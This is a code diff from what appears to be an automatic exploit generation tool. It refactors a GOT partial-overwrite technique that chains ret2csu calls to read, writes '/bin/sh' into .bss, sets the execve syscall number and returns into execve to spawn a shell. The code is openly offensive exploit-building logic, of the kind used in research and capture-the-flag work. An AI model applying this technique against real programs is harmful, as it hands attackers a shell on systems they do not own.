@@ -46,6 +46,8 @@ bool GotPartialOverwrite::checkRequirements() const {
 }
 
 std::vector<RopSubchain> GotPartialOverwrite::getRopSubchains() const {
+    using BaseType = BaseOffsetExpr::BaseType;
+
     const Exploit &exploit = g_crax->getExploit();
     const ELF &elf = exploit.getElf();
 
@@ -54,29 +56,29 @@ std::vector<RopSubchain> GotPartialOverwrite::getRopSubchains() const {
 
     // read(0, elf.got['read'], 1), setting RAX to 1.
     RopSubchain read1 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(elf, "sym", "read"),
+        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(0, Expr::Int64),
-        BaseOffsetExpr::create(elf, "got", "read"),
+        BaseOffsetExpr::create<BaseType::GOT>(elf, "read"),
         ConstantExpr::create(1, Expr::Int64))[0];
 
     // write(1, 0, 0), setting RAX to 0.
     RopSubchain read2 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(elf, "sym", "read"),
+        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(1, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64))[0];
 
     // Read "/bin/sh" into elf.bss(), setting RAX to 59.
     RopSubchain read3 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(elf, "sym", "read"),
+        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(0, Expr::Int64),
-        BaseOffsetExpr::create(elf, "bss"),
+        BaseOffsetExpr::create<BaseType::BSS>(elf),
         ConstantExpr::create(59, Expr::Int64))[0];
 
     // Return to sys_execve.
     RopSubchain read4 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(elf, "sym", "read"),
-        BaseOffsetExpr::create(elf, "bss"),
+        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
+        BaseOffsetExpr::create<BaseType::BSS>(elf),
         ConstantExpr::create(0, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64))[0];
 
